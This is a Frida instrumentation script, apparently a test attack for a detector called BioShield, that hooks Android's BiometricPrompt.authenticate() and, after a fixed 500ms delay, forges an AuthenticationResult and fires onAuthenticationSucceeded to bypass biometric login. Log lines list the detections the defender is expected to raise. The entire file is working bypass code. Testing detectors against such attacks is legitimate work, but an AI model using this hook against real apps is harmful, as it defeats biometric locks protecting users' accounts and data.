// === REPLAY ATTACK DEMONSTRATION ===
// This script replays prerecorded timing patterns
// BioShield should detect: REPLAY_PATTERN + LOW_TIMING_ENTROPY

console.log("=== [ATTACK] Replay Attack Script Loaded ===");

// Prerecorded timing pattern from a "captured" legitimate session
const REPLAY_TIMINGS = [500, 500, 500, 500]; // Constant 500ms intervals
let replayIndex = 0;

Java.perform(() => {
    try {
        const BiometricPrompt = Java.use("androidx.biometric.BiometricPrompt");

        console.log("[+] Hooking BiometricPrompt.authenticate()");

        BiometricPrompt.authenticate.overload('androidx.biometric.BiometricPrompt$PromptInfo').implementation = function(info) {
            console.log("[ATTACK] Intercepted authenticate() - replaying captured session!");

            const result = this.authenticate(info);

            // ATTACK: Replay prerecorded timing pattern
            const delay = REPLAY_TIMINGS[replayIndex % REPLAY_TIMINGS.length];
            replayIndex++;

            console.log("[ATTACK] Using replay timing: " + delay + "ms (pattern index: " + (replayIndex - 1) + ")");

            setTimeout(() => {
                try {
                    const callbackField = this.class.getDeclaredField("mAuthenticationCallback");
                    callbackField.setAccessible(true);
                    const callback = callbackField.get(this);

                    if (callback) {
                        const AuthResult = Java.use("androidx.biometric.BiometricPrompt$AuthenticationResult");
                        const fakeResult = AuthResult.$new(null, 2);

                        console.log("[ATTACK] Triggering replayed success at " + delay + "ms");
                        callback.onAuthenticationSucceeded(fakeResult);
                    }
                } catch (e) {
                    console.log("[ERROR] Failed to trigger callback: " + e);
                }
            }, delay);

            return result;
        };

        console.log("[OK] Replay attack ready - using constant 500ms intervals");
        console.log("[!] Expected BioShield detection:");
        console.log("    - REPLAY_PATTERN: repeating intervals detected");
        console.log("    - LOW_TIMING_ENTROPY: < 0.5");
        console.log("    - CONSTANT_TIME_LEAK: variance < 10ms");
        console.log("    - Side-channel score: ~50-75/100");

    } catch (e) {
        console.log("[-] Failed to hook BiometricPrompt: " + e);
    }
});
